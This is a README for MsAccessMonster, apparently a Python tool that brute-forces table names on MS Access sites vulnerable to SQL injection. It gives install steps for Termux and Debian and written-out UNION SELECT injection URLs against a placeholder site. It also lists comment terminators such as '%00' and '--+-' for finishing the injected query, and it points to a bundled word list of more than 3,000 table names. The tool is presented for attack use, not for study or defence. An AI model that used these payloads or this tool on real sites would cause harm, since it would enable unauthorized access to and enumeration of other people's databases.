## MsAccessMonster
A fast tool for bruteforcing the Ms Access SQL Injection vulnerable sites with 3k+ possible table names.

### Compatible devices
- As this tool is completely written in python, it will run in all devices including, Termux and Debian based OS ( Ubuntu, Kali etc. ).

### Installation & running process
- For Termux ( Android )
```
pkg update && pkg upgrade -y
```
```
pkg install git && python3
```
```
pip install requests
```
```
git clone https://github.com/EverythingVulnerable/MsAccessMonster
```
- For Debian based OS
```
sudo su
```
```
apt-get update && apt upgrade -y
```
```
apt-get install python3 && python3-pip && git
```
```
git clone https://github.com/EverythingVulnerable/MsAccessMonster
```

### Tool running commands ( for every devices & OS )
```
cd MsAccessMonster
```
```
python3 ms.py
```
Then, you will be asked for a Ms Access Vulnerable Site. Give it like this,
```
https://www.everythingvuln1.com/vuln.php?id=1 and 0 union select 1,2,3,4 from
```
Or,
```
https://www.everythingvuln1.com/vuln.php?id=1'and 0 union select 1,2,3,4 from
```
***Note :: Use the word "from" after the 1st input or, the tool won't work properly***.

Then, you will be asked to give the comment of the query. This can be anything. Depends on the website. Such as,
```
--
--+-
%00
;%00
```
After giving the perfect comment, you will be told to give your table_name's list or, word list. By default, we have given a default word list which contains 3k+ table names. If you want to use that put your command like this,
```
tables.txt
```
If you want to give your custom word list put the path then. For example,
```
/sdcard/tables.txt
```
Now, hit enter and wait for the matched response. For example,
```
[$] Site link: https://www.everythingvuln1.com/vuln.php?id=1 and 0 union select 1,2,3,4 from ..... %00
```
Here, ```...``` is the correct table names
